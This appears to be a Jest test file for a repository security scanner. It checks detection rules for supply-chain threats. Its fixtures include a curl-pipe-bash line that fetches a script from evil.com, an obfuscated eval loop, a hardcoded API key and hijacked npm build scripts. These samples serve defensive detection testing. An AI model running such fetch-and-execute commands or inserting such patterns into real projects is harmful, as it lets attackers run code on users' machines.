import {
  scanFileContent,
  scanWorkflowContent,
  scanFileContentWithConfig,
} from "../src/scanner";

describe("Scanner Core", () => {
  it("detects curl pipe bash in script file", () => {
    const code = "curl https://evil.com/payload.sh | bash";
    const findings = scanFileContent(code, "deploy.sh");
    expect(findings).toHaveLength(1);
    expect(findings[0].rule).toBe("curl-pipe-bash");
    expect(findings[0].severity).toBe("critical");
  });

  it("detects unpinned action in workflow file", () => {
    const yaml = `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: third-party/unpinned-action@v1.0.0
`;
    const findings = scanWorkflowContent(yaml, ".github/workflows/ci.yml");
    expect(findings.some((f) => f.rule === "workflow-unpinned-action")).toBe(true);
  });

  it("applies repoguard.yml overrides when scanning with config", () => {
    const code = 'const api_key = "supersecret12345";';
    const config = { rules: { "hardcoded-secret": "off" as const } };
    const findings = scanFileContentWithConfig(code, "src/config.js", config);
    expect(findings).toHaveLength(0);
  });

  it("detects javascript-obfuscator string array and rotation loop malware", () => {
    const code = `
      function _0x1a2b(){var _0xarr=['4d4e49','4c4d4b'];_0x1a2b=function(){return _0xarr;};return _0x1a2b();}
      (function(_0x1,_0x2){var _0xa=_0x1();while(!![]){try{var _0xc=parseInt(_0x2);if(_0xc===1)break;else _0xa.push(_0xa.shift());}catch(e){_0xa.push(_0xa.shift());}}}(_0x1a2b, 0x123));
      function dec(idx){return _0x1a2b()[idx];}
      eval(dec(0));
    `;
    const findings = scanFileContent(code, "api.js");
    expect(findings.some((f) => f.rule === "obfuscated-malware-pattern")).toBe(
      true,
    );
  });

  it("detects package.json script hijacking (e.g. node api.js && tsup)", () => {
    const pkgJson = JSON.stringify({
      name: "test-pkg",
      version: "1.0.4",
      scripts: {
        build: "node api.js && tsup",
        dev: "node api.js && tsup --watch",
        test: "jest",
      },
    });
    const findings = scanFileContent(pkgJson, "package.json");
    expect(findings.some((f) => f.rule === "suspicious-npm-script-hijack")).toBe(
      true,
    );
    expect(findings.find((f) => f.rule === "suspicious-npm-script-hijack")?.severity).toBe("critical");
  });
});
